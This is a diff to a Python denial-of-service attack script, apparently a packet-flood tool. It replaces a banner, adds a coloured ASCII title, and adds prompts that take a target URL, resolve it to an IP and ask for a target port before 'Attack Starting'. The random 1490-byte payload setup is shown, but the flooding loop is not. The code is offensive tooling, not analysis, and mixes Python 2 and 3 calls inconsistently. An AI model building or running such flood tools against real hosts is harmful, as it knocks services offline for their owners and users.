@@ -18,12 +18,22 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : Muzan
-print
-ip = raw_input(" IP Target : => ")
-port = input(" Port  : => ")
+os.system("figlet DDos")
+print("""\033[94m
+███████████████████████████████████████████████
+█─▄▄─█▄─▀─▄█▄─▄▄─█▀░████▄─▄▄▀█▄─▄▄▀█─▄▄─█─▄▄▄▄█
+█─██─██▀─▀███─▄████░█████─██─██─██─█─██─█▄▄▄▄─█
+▀▄▄▄▄▀▄▄█▄▄▀▄▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▄▀
+
+""")
+#ip
+url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
+url_chek =requests.get(url)
+ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
+print(ip)
+print()
+ip = raw_input("\033[94m IP Target \033[1;31;40m  ==> : \033[0m")
+port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")
 
 os.system("clear")
 os.system("figlet Attack Starting")
